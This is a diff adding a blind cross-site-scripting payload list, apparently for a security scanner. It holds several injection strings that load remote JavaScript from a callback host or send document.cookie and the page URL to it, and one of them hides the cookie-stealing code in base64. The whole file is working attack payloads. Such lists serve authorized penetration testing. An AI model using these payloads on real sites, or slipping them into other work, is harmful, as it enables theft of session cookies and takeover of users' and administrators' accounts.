@@ -1,0 +1,13 @@
+# Blind XSS — fire-and-forget payloads that call home when executed
+# (admin panels, log viewers, support tools). {CALLBACK} is replaced at
+# scan time with your callback base URL + unique token.
+"><script src="{CALLBACK}/p/{TOKEN}.js"></script>
+"><script src={CALLBACK}/p/{TOKEN}.js></script>
+<script src="{CALLBACK}/p/{TOKEN}.js"></script>
+<img src=x onerror="fetch('{CALLBACK}/c/{TOKEN}?d='+encodeURIComponent(document.cookie))">
+<svg onload="new Image().src='{CALLBACK}/c/{TOKEN}?d='+encodeURIComponent(document.cookie)">
+'"><svg onload="fetch('{CALLBACK}/c/{TOKEN}?l='+location.href)">
+"><img src=x onerror="import('{CALLBACK}/p/{TOKEN}.js')">
+"><script>$.getScript('{CALLBACK}/p/{TOKEN}.js')</script>
+javascript:eval('var a=document.createElement("script");a.src="{CALLBACK}/p/{TOKEN}.js";document.body.appendChild(a)')
+"><input onfocus="eval(atob(this.id))" id="bmV3IEltYWdlKCkuc3JjPSd7Q0FMTEJBQ0t9L2Mve1RPS0VOfT9kPScrZW5jb2RlVVJJQ29tcG9uZW50KGRvY3VtZW50LmNvb2tpZSk=" autofocus>
